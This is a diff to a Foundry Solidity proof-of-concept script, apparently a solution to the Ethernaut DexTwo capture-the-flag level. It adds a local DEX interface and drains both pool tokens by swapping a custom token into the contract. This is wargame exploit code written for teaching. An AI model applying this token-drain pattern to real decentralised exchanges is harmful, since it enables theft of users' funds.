@@ -1,11 +1,23 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.24;
+pragma solidity ^0.8.20;
 
-import {Script} from "forge-std/Script.sol";
-import "../challenges/Ilevel23.sol";
+import {Script, console2} from "forge-std/Script.sol";
 
-contract POC is Script {
-    DexTwo level23 = DexTwo(0xcEba857710790f945EC26A5B96Ef6D495F4BF3A5);
+interface IDexTwo {
+    function swap(address from, address to, uint256 amount) external;
+
+    function balanceOf(
+        address token,
+        address owner
+    ) external view returns (uint256);
+
+    function token1() external view returns (address);
+
+    function token2() external view returns (address);
+}
+
+contract PoC is Script {
+    IDexTwo level23 = IDexTwo(0xcEba857710790f945EC26A5B96Ef6D495F4BF3A5);
 
     function run() external {
         uint256 deployer = vm.envUint("PRIVATE_KEY");
@@ -18,11 +30,11 @@ contract POC is Script {
         level23.swap(ZTN, token1, 100);
         level23.swap(ZTN, token2, 200);
 
-        console.log(
+        console2.log(
             "Remaining token1 balance : ",
             level23.balanceOf(token1, address(level23))
         );
-        console.log(
+        console2.log(
             "Remaining token2 balance : ",
             level23.balanceOf(token2, address(level23))
         );
